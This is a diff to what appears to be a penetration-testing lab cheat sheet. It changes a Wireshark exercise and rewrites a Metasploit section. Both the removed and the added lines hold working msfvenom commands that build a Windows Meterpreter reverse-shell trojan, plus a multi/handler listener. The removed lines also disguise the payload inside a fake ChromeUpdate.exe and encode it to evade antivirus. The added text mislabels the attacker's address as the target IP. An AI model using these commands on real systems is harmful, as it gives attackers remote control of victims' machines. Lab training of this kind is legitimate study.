@@ -104,7 +104,7 @@ sudo apt install wireshark -y
 wireshark                    # launch
 # HTTP:
 #  1. Start capture on eth0
-#  2. Go to http://testphp.vulnweb.com/login.php
+#  2. Go to http://testasp.vulnweb.com/
 #  3. Enter fake login, submit
 #  4. Stop capture
 #  5. Filter: http
@@ -122,25 +122,13 @@ wireshark                    # launch
 sudo apt install metasploit-framework -y # install if needed
 sudo msfdb init                          # init database
 msfconsole                               # launch metasploit
-  db_status                              # check DB connected
-  search platform:windows                # find windows payloads
-
-# Generate payload (run in normal terminal, not msfconsole):
-ifconfig                                 # note your attacker IP
-msfvenom --payload windows/meterpreter/reverse_tcp \
-  --arch x86 --format exe \
-  LHOST=<attacker_IP> LPORT=4444 > windowsMeterpreter.exe
-
-# Disguised payload (embedded in legit exe):
-msfvenom --payload windows/meterpreter/reverse_tcp \
-  --template /home/Downloads/ChromeUpdate.exe \
-  --arch x86 --format exe \
-  --encoding x86/shikata_ga_nai --iterations 500 \
-  LHOST=<attacker_IP> LPORT=4444 > windowsMeterpreter.exe
-
-# Set up listener (inside msfconsole):
-  use exploit/multi/handler
-  set payload windows/meterpreter/reverse_tcp
-  set LHOST <attacker_IP>
-  set LPORT 4444
-  run
+# Go to new terminal without closing msf terminal
+ifconfig
+# Select ethernet ip address this will be target ip address
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<target_ip> LPORT=4444 -f exe > SimpleTrojan.exe
+# Go back to msf terminal
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <target_ip>
+set LPORT 4444
+run
